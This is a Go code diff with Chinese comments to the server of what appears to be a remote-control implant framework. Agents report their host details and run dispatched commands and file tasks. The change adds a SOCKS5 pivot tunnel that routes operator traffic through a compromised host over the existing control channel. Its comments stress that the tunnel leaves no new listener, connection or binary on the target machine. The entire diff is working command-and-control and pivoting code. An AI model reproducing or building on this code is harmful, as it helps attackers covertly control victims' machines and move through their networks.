@@ -22,9 +22,12 @@ import (
 	"sync"
 	"time"
 
+	"coreutil/internal/link"
 	"coreutil/internal/proto"
+
 	"coreutil/internal/tlsx"
 	"coreutil/internal/ws"
+	"github.com/hashicorp/yamux"
 )
 
 var (
@@ -45,6 +48,7 @@ type Agent struct {
 	wsSend func(*proto.Msg) error // WS agent 的消息发送
 	Info   proto.Msg
 	Online bool
+	hub    *link.Hub // mux 通道（穿透）
 }
 
 func (a *Agent) send(m *proto.Msg) error {
@@ -70,10 +74,23 @@ type Server struct {
 	pending sync.Map          // task_id -> chan *proto.Msg
 	seq     uint64
 	token   string
+
+	// 穿透（控制侧监听 → yamux 流 → agent 侧 SOCKS5）
+	socksMu  sync.Mutex
+	socks    map[uint32]*socksEntry
+	socksSeq uint32
+}
+
+// socksEntry 一个已启动的穿透监听
+type socksEntry struct {
+	muxID uint32
+	agent string
+	ln    net.Listener
+	sess  *yamux.Session
 }
 
 func NewServer(tok string) *Server {
-	return &Server{agents: map[string]*Agent{}, token: tok}
+	return &Server{agents: map[string]*Agent{}, token: tok, socks: map[uint32]*socksEntry{}}
 }
 
 func (s *Server) newTaskID() string {
@@ -96,6 +113,9 @@ func (s *Server) agentLoop(a *Agent) {
 			s.mu.Unlock()
 			fmt.Printf("[server] agent %s offline\n", a.Info.AgentID)
 			return
+		}
+		if a.hub.Handle(m) {
+			continue // mux 流式承载：已由 link.Hub 消费
 		}
 		switch m.Type {
 		case proto.MsgResult:
@@ -124,6 +144,7 @@ func (s *Server) handleAgentConn(conn net.Conn) {
 	conn.SetReadDeadline(time.Time{})
 	id := hello.AgentID
 	a := &Agent{conn: conn, writer: bufio.NewWriter(conn), Info: *hello, Online: true}
+	a.hub = link.NewHub(a.send)
 	s.mu.Lock()
 	if old, ok := s.agents[id]; ok { // 旧连接（重连）先断掉
 		old.mu.Lock()
@@ -154,6 +175,7 @@ func (s *Server) dispatch(req proto.Msg, timeout time.Duration) (*proto.Msg, err
 		Type: proto.MsgTask, TaskID: tid, Task: req.Task,
 		Cmd: req.Cmd, Path: req.Path, Data: req.Data, Append: req.Append,
 		BgID: req.BgID, Limit: req.Limit, // Phase B: 后台任务原语透传
+		MuxID: req.MuxID, MuxOp: req.MuxOp, // 穿透：socks 通道 id
 	}
 	if err := a.send(task); err != nil {
 		return nil, fmt.Errorf("send to agent failed: %v", err)
@@ -164,6 +186,106 @@ func (s *Server) dispatch(req proto.Msg, timeout time.Duration) (*proto.Msg, err
 	case <-time.After(timeout):
 		return nil, fmt.Errorf("task timeout (%s)", timeout)
 	}
+}
+
+// ---- 穿透：控制侧监听 → yamux 流 → agent 侧 SOCKS5 ----
+//
+// 目标机上不开监听端口、不新增连接、不新增第三方二进制；隧道流量复用已有控制连接。
+// 每条接入的本地连接 = 一条 yamux 流 = 一次 SOCKS5 会话（含 socks5h 远端解析）。
+
+func (s *Server) startSocks(agentID, listen string) (uint32, string, error) {
+	s.mu.Lock()
+	a, ok := s.agents[agentID]
+	s.mu.Unlock()
+	if !ok {
+		return 0, "", fmt.Errorf("agent not online: %s", agentID)
+	}
+	if a.hub == nil {
+		return 0, "", fmt.Errorf("agent %s has no mux hub", agentID)
+	}
+
+	s.socksMu.Lock()
+	s.socksSeq++
+	id := s.socksSeq
+	s.socksMu.Unlock()
+
+	conn, err := a.hub.Dial(id)
+	if err != nil {
+		return 0, "", fmt.Errorf("mux open: %w", err)
+	}
+	cfg := yamux.DefaultConfig()
+	cfg.LogOutput = io.Discard
+	cfg.EnableKeepAlive = false
+	sess, err := yamux.Client(conn, cfg)
+	if err != nil {
+		_ = conn.Close()
+		return 0, "", fmt.Errorf("yamux client: %w", err)
+	}
+	// 让 agent 在这个通道上开 SOCKS5 服务
+	if _, err := s.dispatch(proto.Msg{AgentID: agentID, Task: proto.TaskSocks, MuxID: id}, 20*time.Second); err != nil {
+		_ = sess.Close()
+		return 0, "", fmt.Errorf("agent 拒绝开 socks: %w", err)
+	}
+	ln, err := net.Listen("tcp", listen)
+	if err != nil {
+		_ = sess.Close()
+		return 0, "", err
+	}
+	e := &socksEntry{muxID: id, agent: agentID, ln: ln, sess: sess}
+	s.socksMu.Lock()
+	s.socks[id] = e
+	s.socksMu.Unlock()
+	go s.socksAcceptLoop(e)
+	fmt.Printf("[server] socks on %s via agent %s (mux %d)\n", ln.Addr(), agentID, id)
+	return id, ln.Addr().String(), nil
+}
+
+func (s *Server) socksAcceptLoop(e *socksEntry) {
+	for {
+		c, err := e.ln.Accept()
+		if err != nil {
+			return
+		}
+		go func() {
+			defer c.Close()
+			st, err := e.sess.OpenStream()
+			if err != nil {
+				return
+			}
+			defer st.Close()
+			done := make(chan struct{}, 2)
+			go func() { _, _ = io.Copy(st, c); done <- struct{}{} }()
+			go func() { _, _ = io.Copy(c, st); done <- struct{}{} }()
+			<-done
+			<-done
+		}()
+	}
+}
+
+func (s *Server) stopSocks(id uint32) error {
+	s.socksMu.Lock()
+	e := s.socks[id]
+	delete(s.socks, id)
+	s.socksMu.Unlock()
+	if e == nil {
+		return fmt.Errorf("no such socks mux: %d", id)
+	}
+	_ = e.ln.Close()
+	_ = e.sess.Close()
+	fmt.Printf("[server] socks stopped (mux %d)\n", id)
+	return nil
+}
+
+func (s *Server) listSocks() []map[string]any {
+	s.socksMu.Lock()
+	defer s.socksMu.Unlock()
+	var out []map[string]any
+	for _, e := range s.socks {
+		out = append(out, map[string]any{
+			"mux": e.muxID, "agent": e.agent, "listen": e.ln.Addr().String(),
+		})
+	}
+	return out
 }
 
 func (s *Server) httpAPI() http.Handler {
@@ -192,6 +314,32 @@ func (s *Server) httpAPI() http.Handler {
 			out = append(out, item{id, info.Hostname, info.OS, info.Arch, info.User, info.PID, a.Online})
 		}
 		json.NewEncoder(w).Encode(map[string]any{"agents": out})
+	}))
+	mux.HandleFunc("/socks", auth(func(w http.ResponseWriter, r *http.Request) {
+		switch r.Method {
+		case http.MethodPost:
+			var req struct{ Agent, Listen string }
+			_ = json.NewDecoder(r.Body).Decode(&req)
+			if req.Listen == "" {
+				req.Listen = "127.0.0.1:1080"
+			}
+			id, addr, err := s.startSocks(req.Agent, req.Listen)
+			if err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			json.NewEncoder(w).Encode(map[string]any{"ok": true, "mux": id, "listen": addr})
+		case http.MethodDelete:
+			var id uint32
+			_, _ = fmt.Sscanf(r.URL.Query().Get("mux"), "%d", &id)
+			if err := s.stopSocks(id); err != nil {
+				http.Error(w, err.Error(), http.StatusNotFound)
+				return
+			}
+			json.NewEncoder(w).Encode(map[string]any{"ok": true})
+		default:
+			json.NewEncoder(w).Encode(map[string]any{"socks": s.listSocks()})
+		}
 	}))
 	mux.HandleFunc("/task", auth(func(w http.ResponseWriter, r *http.Request) {
 		var req proto.Msg
@@ -281,9 +429,9 @@ func (l *serverWSLink) Recv() (*proto.Msg, error) {
 func (l *serverWSLink) Close() error { return l.c.Close() }
 
 // handleAgentConn2 与 handleAgentConn 同逻辑，但走 msgLink 抽象
-func (s *Server) handleAgentConn2(link *serverWSLink) {
-	defer link.Close()
-	hello, err := link.Recv()
+func (s *Server) handleAgentConn2(ln *serverWSLink) {
+	defer ln.Close()
+	hello, err := ln.Recv()
 	if err != nil {
 		return
 	}
@@ -294,7 +442,8 @@ func (s *Server) handleAgentConn2(link *serverWSLink) {
 		fmt.Printf("[server] bad token (ws) from %s\n", "ws")
 		return
 	}
-	a := &Agent{conn: nil, writer: nil, Info: *hello, Online: true, wsSend: link.Send}
+	a := &Agent{conn: nil, writer: nil, Info: *hello, Online: true, wsSend: ln.Send}
+	a.hub = link.NewHub(ln.Send)
 	s.mu.Lock()
 	s.agents[hello.AgentID] = a
 	s.mu.Unlock()
@@ -302,9 +451,12 @@ func (s *Server) handleAgentConn2(link *serverWSLink) {
 		hello.AgentID, hello.OS, hello.Arch, hello.Hostname, hello.User)
 	// 任务循环
 	for {
-		m, err := link.Recv()
+		m, err := ln.Recv()
 		if err != nil {
 			break
+		}
+		if a.hub.Handle(m) {
+			continue
 		}
 		if m.Type == proto.MsgResult {
 			if ch, ok := s.pending.Load(m.TaskID); ok {
